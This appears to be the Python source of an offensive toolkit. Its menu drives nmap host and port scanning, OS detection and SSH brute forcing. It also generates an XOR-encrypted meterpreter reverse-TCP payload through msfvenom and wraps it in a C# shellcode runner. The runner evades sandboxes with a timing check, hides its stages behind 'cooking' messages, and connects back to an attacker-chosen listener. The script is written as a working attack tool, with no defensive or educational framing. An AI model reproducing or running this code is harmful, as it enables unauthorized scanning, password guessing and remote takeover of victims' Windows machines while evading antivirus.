import nmap3
import re
import ssh_brute_force
import subprocess
import random, string

regex_ip_subnet = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]){1}(|\/([0-9]|[1-2][0-9]|3[0,1,2]))$"
regex_ip = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]){1}"

menu_options = {
    1: 'Hosts Discovery',
    2: 'Ports Scanning',
    3: 'OS Scanning',
    4: 'Brute Force SSH',
    5: 'Generate Type Of Payload',
    6: 'Exit',
}


def print_menu():
    for key in menu_options.keys():
        print(key, '--', menu_options[key])


def discovery_host(subnet_address):
    nmap = nmap3.NmapHostDiscovery()
    results = nmap.nmap_no_portscan(subnet_address)

    print("-----------------------------------------------------------------------")
    print("{:>40} %s".format("Result Discovery Hosts On") % subnet_address)
    print("-----------------------------------------------------------------------")
    print(" {:<5} {:<15} {:<8} {:<20} {:<30}".format("No", "IP address", "Status", "Mac Address", "Device Name"))    

    count =0    
    for i in results:
         count = count + 1
         for j in results[i]:
             if j == 'macaddress':
                 if results[i][j] is None:
                    print(" {:<5} {:<15} {:^8} {:<20} {:<30}".format(str(count),i,results[i]['state']['state'],"",""))
                 else:
                    for k in results[i][j]:
                        if k == 'vendor':
                            if results[i][j][k] is None:
                                print(" {:<5} {:<15} {:^8} {:<20} {:<30}".format(str(count),i,results[i]['state']['state'],results[i][j]['addr'],""))
                            else:
                                print(" {:<5} {:<15} {:^8} {:<20} {:<30}".format(str(count),i,results[i]['state']['state'],results[i][j]['addr'],results[i][j]['vendor']))
    print("-----------------------------------------------------------------------")

    print(f"-----------------------------------------------------------------------")


def ports_scanner(ip_address):
    nmap = nmap3.NmapHostDiscovery()
    results = nmap.nmap_portscan_only(ip_address)
    print("-----------------------------------------------------------------------")
    print("{:>40} %s".format("Result Port Scanning On") % ip_address)
    print(f"-----------------------------------------------------------------------")
    print("{:<20} {:^20} {:>20}".format("Port", "Service", "State"))
    for i in results:
        for j in results[i]:
            if 'ports' in j:
                for k in results[i][j]:
                   if 'portid' and 'state' in k:
                        print("{:<20} {:^20} {:>20}".format(k['portid'], k['service']['name'], k['state']))

    print(f"-----------------------------------------------------------------------")


def os_scan(ip_address):
    nmap = nmap3.Nmap()
    os_results = nmap.nmap_os_detection(ip_address)

    for i in os_results:
        for j in os_results[i]:
            if 'osmatch' in j:
                for k in os_results[i][j]:
                    if 'accuracy' in k:
                        if k['accuracy'] == '99' or k['accuracy'] == '100':
                            return k['name'], k['accuracy']
            else:
                if 'macaddress' in j:
                    for k in os_results[i][j]:
                        if 'vendor' in k:
                            return os_results[i][j]['vendor']


def print_os_scan_results(ip_address):
    print("-----------------------------------------------------------------------")
    print("{:>40} %s".format("Result Os Scanning On") % ip_address)
    print(f"-----------------------------------------------------------------------")

    results = os_scan(ip_address)
    if results == None:
        print("None Results!")
    elif len(results) == 2:
        print("{} {}%".format(results[0], results[1]))
    else:
        print("{} machine".format(results))

    print(f"-----------------------------------------------------------------------")


def get_random_string(length):
    letters = string.ascii_letters + string.digits
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


def create_method_1():
    lhost = input("Enter listener IP Address : ")
    lport = input("Enter listener port : ")
    key = input("Enter The Key Encrypt:")
    if key == "":
        key = get_random_string(40)
    print(key)
    print("[+]Creating payload ")
    result = subprocess.run(
        ['msfvenom', '-a', 'x64', '--platform', 'windows', '-p', 'windows/x64/meterpreter/reverse_tcp',
         'LHOST=' + f'{lhost}', 'LPORT=' + f'{lport}', '-n', '2', '-i', '26', 'EXITFUNC=thread', '-f',
         'csharp'], capture_output=True)
    payload_string = result.stdout.decode()
    print("Success!")
    print("[+]Encrypting")
    encryptor_cs = "using System; using System.IO; using System.Text; public class Program { private static byte[] xor(byte[] cipher, byte[] key) { byte[] xored = new byte[cipher.Length]; for (int i = 0; i < cipher.Length; i++) { xored[i] = (byte)(cipher[i] ^ key[i % key.Length]); } return xored; } static void Main() { string key = \"" + f"{key}" + "\"; " + f"{payload_string}" + "byte[] xorshellcode; xorshellcode = xor(buf, Encoding.ASCII.GetBytes(key)); StringBuilder newshellcode = new StringBuilder(); newshellcode.Append(\"byte[] candyx = new byte[\"); newshellcode.Append(xorshellcode.Length); newshellcode.Append(\"] { \"); for (int i = 0; i < xorshellcode.Length; i++) { newshellcode.Append(\"0x\"); newshellcode.AppendFormat(\"{0:x2}\", xorshellcode[i]); if (i < xorshellcode.Length - 1) { newshellcode.Append(\", \"); } } newshellcode.Append(\" };\"); Console.WriteLine(newshellcode.ToString()); return; } }"
    f = open("encryptor.cs", "w")
    f.write(encryptor_cs)
    f.close()
    encryptor_exe = subprocess.run(['mcs', '-out:encryptor.exe', 'encryptor.cs'])
    encryptor_result = subprocess.run(['mono', 'encryptor.exe'], capture_output=True)
    encrypted_out = encryptor_result.stdout.decode()
    print("Success!")
    print("[+]Making exe")
    payload_cs = "using System; using System.Text; using System.Runtime.InteropServices; namespace XORShellRunner { public class Program { public const uint EXECUTEREADWRITE = 0x40; public const uint COMMIT_RESERVE = 0x1000; [DllImport(\"kernel32\")] public static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] public static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId); [DllImport(\"kernel32\")] public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds); [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocExNuma( IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred); [DllImport(\"kernel32.dll\")] static extern void Sleep(uint dwMilliseconds); [DllImport(\"kernel32.dll\")] static extern IntPtr GetCurrentProcess(); private static byte[] xor(byte[] cipher, byte[] key) { byte[] xored = new byte[cipher.Length]; for (int i = 0; i < cipher.Length; i++) { xored[i] = (byte)(cipher[i] ^ key[i % key.Length]); } return xored; } private static void copy(Byte[] Patch, IntPtr Address, int length) { Marshal.Copy(Patch, 0, Address, length); } static void Main(string[] args) { Console.WriteLine(\"[+] Mixing\"); IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0); if (mem == null) { Console.WriteLine(\"(Mixing) failed\"); return; } Console.WriteLine(\"[+] Baking \"); DateTime time1 = DateTime.Now; Sleep(3000); double time2 = DateTime.Now.Subtract(time1).TotalSeconds; if (time2 < 2.5) { Console.WriteLine(\"(Baking) [-] Failed check\"); return; } Console.WriteLine(\"[+] Cooking\");string recipe = \"" + f"{key}" + "\"; " + f"{encrypted_out}" + "byte[] candy; candy = xor(candyx, Encoding.ASCII.GetBytes(recipe)); Console.WriteLine(\"[+] Plating\"); int lengthing = candy.Length; UInt32 codeAddr = VirtualAlloc(0, (UInt32)lengthing, COMMIT_RESERVE, EXECUTEREADWRITE); Console.WriteLine(\"[+] Serving\"); copy(candy, (IntPtr)(codeAddr), lengthing); Console.WriteLine(\"[+] Eating\"); IntPtr threadHandle = IntPtr.Zero; UInt32 threadId = 0; IntPtr parameter = IntPtr.Zero; threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId); WaitForSingleObject(threadHandle, 0xFFFFFFFF); return; } } }"
    f = open("payload.cs", "w")
    f.write(payload_cs)
    f.close()
    payload_exe = subprocess.run(['mcs', '-out:payload.exe', 'payload.cs'])


def option1():
    print('1. Hosts discovery')
    subnet_address = 'x'
    while not re.match(regex_ip_subnet, subnet_address):
        subnet_address = input("Enter subnet address you want to scan for example (192.168.1.0/24) default gateway : ")
    else:
        discovery_host(subnet_address)


def option2():
    print('2. Ports Scanning')
    subnet_address = 'x'
    while not re.match(regex_ip_subnet, subnet_address):
        subnet_address = input("Enter the target you want to scan : ")
    else:
        ports_scanner(subnet_address)


def option3():
    print('3. OS Scanning')
    subnet_address = 'x'
    while not re.match(regex_ip_subnet, subnet_address):
        subnet_address = input("Enter the target you want to scan : ")
    else:
        os_scan(subnet_address)
    print_os_scan_results(subnet_address)


def option4():
    print('4. Brute Force SSH')
    ssh_brute_force.get_target_details()
    ssh_brute_force.show_target_details()
    ssh_brute_force.ssh_brute_forcer_dictionary()
    # host = input("Enter The Target:")
    # list_usernames = input("Enter List Usernames:")
    # list_passwords = input("Enter List Passwords:")
    # results = subprocess.run(['hydra', '-L', f'{list_usernames}', '-P', f'{list_passwords}', f'{host} ssh'],
    #                          capture_output=True)
    # print_results = results.stdout.decode()
    # print(print_results)


def option5():
    print('5. XOR payload msfvenom payload')
    create_method_1()
    print()


def banner():
    print("             ,								")
    print("       (`.  : \               __..----..__				")
    print("        `.`.| |:          _,-':::''' '  `:`-._				")
    print("          `.:\||       _,':::::'         `::::`-.			")
    print("            \\`|    _,':::::::'     `:.     `':::`.			")
    print("             ;` `-''  `::::::.                  `::\			")
    print("          ,-'      .::'  `:::::.         `::..    `:\			")
    print("        ,' /_) -.            `::.           `:.     |			")
    print("      ,'.:     `    `:.        `:.     .::.          \			")
    print(" __,-'   ___,..-''-.  `:.        `.   /::::.         |			")
    print("|):'_,--'           `.    `::..       |::::::.      ::\			")
    print(" `-'                 |`--.:_::::|_____\::::::::.__  ::|			")
    print("                     |   _/|::::|      \::::::|::/\  :|			")
    print("                     /:./  |:::/        \__:::):/  \  :\			")
    print("                   ,'::'  /:::|        ,'::::/_/    `. ``-.__		")
    print("                  ''''   (//|/\      ,';':,-'         `-.__  `'--..__	")
    print("                                                           `''---::::'	")


if __name__ == '__main__':
    banner()
    while (True):
        print_menu()
        option = ''
        try:
            option = int(input('Enter your choice: '))
        except:
            print('Wrong input. Please enter a number ...')
        # Check what choice was entered and act accordingly
        if option == 1:
            option1()
        elif option == 2:
            option2()
        elif option == 3:
            option3()
        elif option == 4:
            option4()
        elif option == 5:
            option5()
        elif option == 6:
            print('Thanks message before exiting')
            exit()
        else:
            print('Invalid option. Please enter a number between 1 and 6.')
